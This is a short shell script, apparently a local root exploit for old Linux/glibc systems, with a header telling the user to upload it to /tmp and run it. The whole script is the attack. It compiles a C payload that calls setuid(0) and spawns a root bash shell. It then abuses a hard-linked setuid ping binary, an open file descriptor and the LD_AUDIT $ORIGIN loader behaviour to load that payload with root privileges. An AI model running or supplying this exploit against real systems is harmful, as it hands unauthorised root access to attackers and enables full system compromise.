#####################################################
#	upload the file to /tmp							#
#	cd /tmp											#
#	sh Linux2.6.37.sh								#
#####################################################
#!/bin/sh
cat > /tmp/payload.c << __EOF__
void __attribute__((constructor)) init(){setuid(0); system("/bin/bash"); }
__EOF__
echo "Wait Me Get You Root"
cd /tmp/
mkdir exploit
cd exploit/
ln /bin/ping /tmp/exploit/target
exec 3< /tmp/exploit/target
ls -al
ls -l /proc/$$/fd/3
cd /tmp/
rm -rf /tmp/exploit/
ls -l /proc/$$/fd/3
ls -l /proc/$$/fd/3
gcc -w -fPIC -shared -o /tmp/exploit payload.c
ls -l /tmp/exploit
LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3

